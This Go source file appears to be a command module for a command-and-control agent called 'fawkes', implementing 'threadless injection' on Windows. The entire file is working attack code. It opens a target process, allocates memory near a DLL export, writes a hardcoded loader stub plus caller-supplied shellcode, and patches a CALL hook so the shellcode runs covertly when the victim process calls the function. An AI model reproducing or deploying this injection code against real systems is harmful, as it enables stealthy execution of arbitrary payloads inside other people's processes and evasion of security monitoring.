//go:build windows
// +build windows

// Threadless injection implementation adapted from:
// https://github.com/dreamkinn/go-ThreadlessInject
// Original technique by CCob: https://github.com/CCob/ThreadlessInject

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	kernel32TI = windows.NewLazySystemDLL("kernel32.dll")

	virtualAllocEx     = kernel32TI.NewProc("VirtualAllocEx")
	virtualProtectEx   = kernel32TI.NewProc("VirtualProtectEx")
	writeProcessMemory = kernel32TI.NewProc("WriteProcessMemory")
	readProcessMemory  = kernel32TI.NewProc("ReadProcessMemory")

	// Loader stub from dreamkinn/go-ThreadlessInject
	// This loader:
	// 1. Pops return address and calculates hooked function address
	// 2. Saves all registers
	// 3. Restores original function bytes (placeholder at 0x12)
	// 4. Calls the shellcode
	// 5. Restores registers and jumps back to the restored function
	shellcodeLoader = []byte{
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90,
	}

	callOpCode = []byte{0xe8, 0, 0, 0, 0}
	uintsize   = unsafe.Sizeof(uintptr(0))
)

type ThreadlessInjectCommand struct{}

func (c *ThreadlessInjectCommand) Name() string {
	return "threadless-inject"
}

func (c *ThreadlessInjectCommand) Description() string {
	return "Inject shellcode using threadless injection by hooking a DLL function in a remote process"
}

func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params struct {
		ShellcodeB64 string `json:"shellcode_b64"`
		PID          int    `json:"pid"`
		DLLName      string `json:"dll_name"`
		FunctionName string `json:"function_name"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Shellcode is required",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode shellcode
	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to decode shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Perform threadless injection
	output, err := threadlessInject(uint32(params.PID), shellcode, params.DLLName, params.FunctionName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Threadless injection failed: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *ThreadlessInjectCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func generateHook(payload []byte, originalBytes []byte) {
	// Overwrite dummy 0x887766.. instructions in loader to restore original bytes of the hooked function
	for i := 0; i < len(originalBytes); i++ {
		payload[0x12+i] = originalBytes[i]
	}
}

func findMemoryHole(pHandle uintptr, exportAddress, size uintptr) (uintptr, error) {
	remoteLoaderAddress := uintptr(0)
	found := false

	for remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress+0x70000000; remoteLoaderAddress += 0x10000 {
		ret, _, _ := virtualAllocEx.Call(
			pHandle,
			remoteLoaderAddress,
			size,
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)
		if ret != 0 {
			found = true
			break
		}
	}

	if !found {
		return 0, fmt.Errorf("could not find memory hole within +/-2GB")
	}

	return remoteLoaderAddress, nil
}

func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string) (string, error) {
	var output string

	output += fmt.Sprintf("[+] Starting threadless injection into PID %d\n", pid)
	output += fmt.Sprintf("[+] Target DLL: %s, Function: %s\n", dllName, functionName)
	output += fmt.Sprintf("[+] Shellcode size: %d bytes\n", len(shellcode))

	// Open target process
	pHandle, errOpenProcess := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if errOpenProcess != nil {
		return output, fmt.Errorf("failed to open process: %v", errOpenProcess)
	}
	defer windows.CloseHandle(pHandle)
	output += fmt.Sprintf("[+] Opened process handle: 0x%x\n", pHandle)

	// Get address of remote function to hook (GetModuleHandle + LoadLibrary under the hood)
	DLL := windows.NewLazySystemDLL(dllName)
	remote_fct := DLL.NewProc(functionName)
	exportAddress := remote_fct.Addr()
	output += fmt.Sprintf("[+] Target function address: 0x%x\n", exportAddress)

	// Create payload (loader + shellcode)
	payload := append(shellcodeLoader, shellcode...)
	payloadSize := len(payload)
	output += fmt.Sprintf("[+] Payload size (loader + shellcode): %d bytes\n", payloadSize)

	// Find memory hole within +/-2GB of the target function
	loaderAddress, holeErr := findMemoryHole(uintptr(pHandle), exportAddress, uintptr(payloadSize))
	if holeErr != nil {
		return output, fmt.Errorf("failed to find memory hole: %v", holeErr)
	}
	output += fmt.Sprintf("[+] Allocated memory at: 0x%x\n", loaderAddress)

	// Read original bytes of the remote function
	originalBytes := make([]byte, 8)
	var bytesRead uintptr
	ret, _, _ := readProcessMemory.Call(
		uintptr(pHandle),
		exportAddress,
		uintptr(unsafe.Pointer(&originalBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to read original function bytes")
	}
	output += fmt.Sprintf("[+] Read original bytes: %x\n", originalBytes)

	// Write function original bytes to loader, so it can restore after one-time execution
	generateHook(payload, originalBytes)

	// Calculate relative address for the CALL instruction (but don't write hook yet!)
	relativeLoaderAddress := uint32(uint64(loaderAddress) - (uint64(exportAddress) + 5))
	relativeLoaderAddressArray := make([]byte, uintsize)
	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)

	// Build the 5-byte CALL instruction
	hook := make([]byte, 5)
	copy(hook, callOpCode)
	hook[1] = relativeLoaderAddressArray[0]
	hook[2] = relativeLoaderAddressArray[1]
	hook[3] = relativeLoaderAddressArray[2]
	hook[4] = relativeLoaderAddressArray[3]
	output += fmt.Sprintf("[+] Hook bytes: %x\n", hook)

	// Unprotect remote function memory (but don't write hook yet!)
	var oldProtect uint32
	ret, _, _ = virtualProtectEx.Call(
		uintptr(pHandle),
		exportAddress,
		8,
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to unprotect function memory")
	}
	output += "[+] Changed function memory protection to RWX\n"

	// Unprotect loader allocated memory
	ret, _, _ = virtualProtectEx.Call(
		uintptr(pHandle),
		loaderAddress,
		uintptr(payloadSize),
		windows.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to unprotect loader memory")
	}

	// Write loader+shellcode to allocated memory FIRST (before hooking!)
	ret, _, _ = writeProcessMemory.Call(
		uintptr(pHandle),
		loaderAddress,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(payloadSize),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to write payload")
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to remote process\n", bytesRead)

	// Protect loader allocated memory
	ret, _, _ = virtualProtectEx.Call(
		uintptr(pHandle),
		loaderAddress,
		uintptr(payloadSize),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to protect loader memory")
	}
	output += "[+] Changed payload memory to PAGE_EXECUTE_READ\n"

	// NOW write the hook (payload is ready in memory!)
	ret, _, _ = writeProcessMemory.Call(
		uintptr(pHandle),
		exportAddress,
		uintptr(unsafe.Pointer(&hook[0])),
		uintptr(len(hook)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to write hook")
	}
	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", bytesRead)

	// Restore function protection
	ret, _, _ = virtualProtectEx.Call(
		uintptr(pHandle),
		exportAddress,
		8,
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to restore function memory protection")
	}
	output += "[+] Restored function memory protection to PAGE_EXECUTE_READ\n"

	output += "[+] Threadless injection complete!\n"
	output += "[+] Shellcode will execute when the target process calls the hooked function\n"
	output += "[+] After execution, the function will be automatically restored\n"

	return output, nil
}
